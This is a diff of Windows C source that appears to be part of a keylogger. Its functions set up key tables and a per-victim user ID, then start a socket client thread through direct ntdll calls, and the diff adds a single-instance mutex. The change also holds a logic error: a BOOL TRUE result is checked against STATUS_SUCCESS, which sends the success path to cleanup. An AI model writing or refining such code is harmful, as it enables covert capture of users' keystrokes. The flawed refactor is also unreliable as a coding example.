@@ -89,12 +89,34 @@ HMODULE getModuleHandle() {
     return NULL;
 }
 
+BOOL initStrings(char** resultOut, char** userIdOut) {
+    char* result = malloc(3000);
+    if (result == NULL) {
+        return FALSE;
+    }
+    strcpy(result, "");
+
+    char* userId = malloc(37);
+    if (userId == NULL) {
+        return FALSE;
+    }
+
+    LPBYTE tempUserId = getOrCreateAndGetUserId();
+    wcstombs(userId, (wchar_t*)tempUserId, 37);
+
+    *resultOut = result;
+    *userIdOut = userId;
+
+    return TRUE;
+}
+
 int main() {
     BOOL State = TRUE;
     NTSTATUS Status = 0;
     HMODULE NtdllHandle = NULL;
     PVOID Buffer = NULL;
     HANDLE thread = NULL;
+    HANDLE hMutex = NULL;
     HANDLE procH = NULL;
     OBJECT_ATTRIBUTES OA;
 
@@ -119,20 +141,15 @@ int main() {
     initKeysCombinations(combinations);
     initKeys(keys);
 
-    result = malloc(sizeof(char) * 3000);
-    if (result == NULL) {
-        exit(0);
+    Status = initStrings(&result, &userId);
+    if (STATUS_SUCCESS != Status) {
+        State = FALSE; goto CLEANUP;
     }
 
-    userId = malloc(sizeof(char) * 37);
-    if (userId == NULL) { 
-        exit(0);
+    Status = NtCreateMutant(&hMutex, SYNCHRONIZE, NULL, FALSE);
+    if (STATUS_SUCCESS != Status) {
+        State = FALSE; goto CLEANUP;
     }
-
-    LPBYTE tempUserId = getOrCreateAndGetUserId();
-    wcstombs(userId, (wchar_t*)tempUserId, 37 * sizeof(char));
-
-    strcpy(result, "");
 
     Status = NtCreateThreadEx(&thread, THREAD_QUERY_INFORMATION, NULL, GetCurrentProcess(), (long int (*)(void *))initSocketClient, NULL, FALSE, 0, 0, 0, NULL);
     if (STATUS_SUCCESS != Status) {
@@ -143,6 +160,10 @@ int main() {
 CLEANUP:
     if (thread) {
         NtClose(thread);
+    }
+
+    if (hMutex) {
+        NtClose(hMutex);
     }
 
     if (procH) {
